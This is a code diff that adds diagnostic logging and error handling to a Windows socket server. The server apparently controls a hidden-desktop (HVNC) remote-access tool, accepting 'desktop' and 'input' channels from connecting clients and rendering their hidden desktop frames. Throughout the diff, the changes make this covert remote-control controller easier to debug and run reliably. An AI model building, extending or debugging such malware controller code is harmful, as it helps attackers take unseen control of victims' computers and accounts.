@@ -54,6 +54,35 @@ static Client           g_clients[gc_maxClients];
 static DWORD            g_nextSessionId = 1;
 static CRITICAL_SECTION g_critSec;
 
+static const TCHAR *ConnectionName(int connection)
+{
+   switch(connection)
+   {
+      case Connection::desktop:
+         return TEXT("desktop");
+      case Connection::input:
+         return TEXT("input");
+      default:
+         return TEXT("unknown");
+   }
+}
+
+static void GetPeerIp(SOCKET s, char *ip, int ipSize)
+{
+   if(ipSize <= 0)
+      return;
+
+   ip[0] = 0;
+
+   SOCKADDR_IN addr;
+   int         addrSize = sizeof(addr);
+   if(getpeername(s, (SOCKADDR *) &addr, &addrSize) == 0)
+      lstrcpynA(ip, inet_ntoa(addr), ipSize);
+
+   if(!ip[0])
+      lstrcpynA(ip, "unknown", ipSize);
+}
+
 static DWORD CreateSessionId()
 {
    DWORD sessionId = g_nextSessionId++;
@@ -358,22 +387,30 @@ static DWORD WINAPI ClientThread(PVOID param)
    BYTE       buf[sizeof(gc_magik)];
    int        connection;
    DWORD      uhid;
+   char       peerIp[16];
+
+   GetPeerIp(s, peerIp, sizeof(peerIp));
+   wprintf(TEXT("[diag] Incoming socket accepted from %hs\n"), peerIp);
 
    if(!RecvAll(s, buf, (int) sizeof(gc_magik)))
    {
+      wprintf(TEXT("[!] Handshake failed from %hs: magic was not received\n"), peerIp);
       closesocket(s);
       return 0;
    }
    if(memcmp(buf, gc_magik, sizeof(gc_magik)))
    {
+      wprintf(TEXT("[!] Handshake failed from %hs: bad magic\n"), peerIp);
       closesocket(s);
       return 0;
    }
    if(!RecvInt(s, &connection))
    {
+      wprintf(TEXT("[!] Handshake failed from %hs: channel id was not received\n"), peerIp);
       closesocket(s);
       return 0;
    }
+   wprintf(TEXT("[diag] %s channel requested by %hs\n"), ConnectionName(connection), peerIp);
    {
       SOCKADDR_IN addr;
       int         addrSize;
@@ -388,6 +425,7 @@ static DWORD WINAPI ClientThread(PVOID param)
          int receivedSessionId;
          if(!RecvInt(s, &receivedSessionId) || !receivedSessionId)
          {
+            wprintf(TEXT("[!] Desktop channel rejected from %hs: invalid session id\n"), peerIp);
             closesocket(s);
             return 0;
          }
@@ -398,12 +436,14 @@ static DWORD WINAPI ClientThread(PVOID param)
       client = GetClientByUhidAndSession(uhid, sessionId);
       if(!client || client->connections[Connection::desktop])
       {
+         wprintf(TEXT("[!] Desktop channel rejected from %hs: no matching input session or duplicate desktop channel (session %lu)\n"), peerIp, sessionId);
          LeaveCriticalSection(&g_critSec);
          closesocket(s);
          return 0;
       }
       client->connections[Connection::desktop] = s;
       LeaveCriticalSection(&g_critSec);
+      wprintf(TEXT("[+] Desktop channel connected: %hs (session %lu)\n"), peerIp, sessionId);
 
       BITMAPINFO bmpInfo;
       bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
@@ -412,6 +452,8 @@ static DWORD WINAPI ClientThread(PVOID param)
       bmpInfo.bmiHeader.biCompression = BI_RGB;
       bmpInfo.bmiHeader.biClrUsed = 0;
 
+      BOOL firstFrameLogged = FALSE;
+      BOOL noFrameLogged = FALSE;
       for(;;)
       {
          RECT rect;
@@ -440,6 +482,11 @@ static DWORD WINAPI ClientThread(PVOID param)
             goto exit;
          if(!value)
          {
+            if(!noFrameLogged)
+            {
+               wprintf(TEXT("[diag] Desktop channel has no changed frame yet: %hs (session %lu). Hidden desktop may be empty.\n"), peerIp, sessionId);
+               noFrameLogged = TRUE;
+            }
             Sleep(gc_sleepNotRecvPixels);
             continue;
          }
@@ -594,10 +641,24 @@ frame_cleanup:
          if(!frameReady)
             goto exit;
 
+         if(!firstFrameLogged)
+         {
+            wprintf(TEXT("[+] First desktop frame rendered: %hs (session %lu), remote=%lux%lu, frame=%lux%lu, compressed=%lu bytes\n"),
+               peerIp,
+               sessionId,
+               screenWidth,
+               screenHeight,
+               width,
+               height,
+               size);
+            firstFrameLogged = TRUE;
+         }
+
          if(!SendInt(s, 0))
             goto exit;
       }
 exit:
+      wprintf(TEXT("[!] Desktop channel closed: %hs (session %lu)\n"), peerIp, sessionId);
       EnterCriticalSection(&g_critSec);
       if(client->uhid == uhid &&
          client->sessionId == sessionId &&
@@ -618,6 +679,7 @@ exit:
          client = GetClientByUhid(uhid);
          if(client)
          {
+            wprintf(TEXT("[!] Input channel rejected from %hs: client already connected\n"), peerIp);
             closesocket(s);
             LeaveCriticalSection(&g_critSec);
             return 0;
@@ -650,11 +712,26 @@ exit:
          client->connections[Connection::input] = s;
 
          client->hWnd = CW_Create(uhid, gc_minWindowWidth, gc_minWindowHeight);
+         if(client->hWnd)
+            wprintf(TEXT("[+] Control window created for %hs: hwnd=0x%p\n"), ip, client->hWnd);
+         else
+            wprintf(TEXT("[!] Control window creation failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
+
          client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
+         if(client->minEvent)
+            wprintf(TEXT("[diag] Minimize/restore event created for %hs\n"), ip);
+         else
+            wprintf(TEXT("[!] CreateEvent failed for %hs: GetLastError=%lu\n"), ip, GetLastError());
       }
       LeaveCriticalSection(&g_critSec);
 
-      SendInt(s, (int) sessionId);
+      if(SendInt(s, (int) sessionId))
+         wprintf(TEXT("[+] Input channel ready: %hs (session %lu)\n"), ip, sessionId);
+      else
+      {
+         wprintf(TEXT("[!] Failed to send session id to %hs\n"), ip);
+         return 0;
+      }
 
       MSG msg;
       while(GetMessage(&msg, NULL, 0, 0) > 0)
@@ -688,24 +765,60 @@ BOOL StartServer(int port)
    sockaddr_in addr;
    HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));
 
+   if(!ntdll)
+   {
+      wprintf(TEXT("[!] LoadLibrary(ntdll.dll) failed: GetLastError=%lu\n"), GetLastError());
+      return FALSE;
+   }
+
    pRtlDecompressBuffer = (T_RtlDecompressBuffer) GetProcAddress(ntdll, "RtlDecompressBuffer");
+   if(!pRtlDecompressBuffer)
+   {
+      wprintf(TEXT("[!] GetProcAddress(RtlDecompressBuffer) failed: GetLastError=%lu\n"), GetLastError());
+      return FALSE;
+   }
+
    InitializeCriticalSection(&g_critSec);
    memset(g_clients, 0, sizeof(g_clients));
-   CW_Register(WndProc);
+   if(CW_Register(WndProc))
+      wprintf(TEXT("[diag] Control window class registered\n"));
+   else
+   {
+      DWORD err = GetLastError();
+      if(err == ERROR_CLASS_ALREADY_EXISTS)
+         wprintf(TEXT("[diag] Control window class already registered\n"));
+      else
+      {
+         wprintf(TEXT("[!] Control window class registration failed: GetLastError=%lu\n"), err);
+         return FALSE;
+      }
+   }
 
    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+   {
+      wprintf(TEXT("[!] WSAStartup failed: WSAGetLastError=%d\n"), WSAGetLastError());
       return FALSE;
+   }
    if((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+   {
+      wprintf(TEXT("[!] socket() failed: WSAGetLastError=%d\n"), WSAGetLastError());
       return FALSE;
+   }
 
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);
 
    if(bind(serverSocket, (sockaddr *) &addr, sizeof(addr)) == SOCKET_ERROR)
+   {
+      wprintf(TEXT("[!] bind() failed on port %d: WSAGetLastError=%d\n"), port, WSAGetLastError());
       return FALSE;
+   }
    if(listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
+   {
+      wprintf(TEXT("[!] listen() failed: WSAGetLastError=%d\n"), WSAGetLastError());
       return FALSE;
+   }
 
    int addrSize = sizeof(addr);
    getsockname(serverSocket, (sockaddr *) &addr, &addrSize);
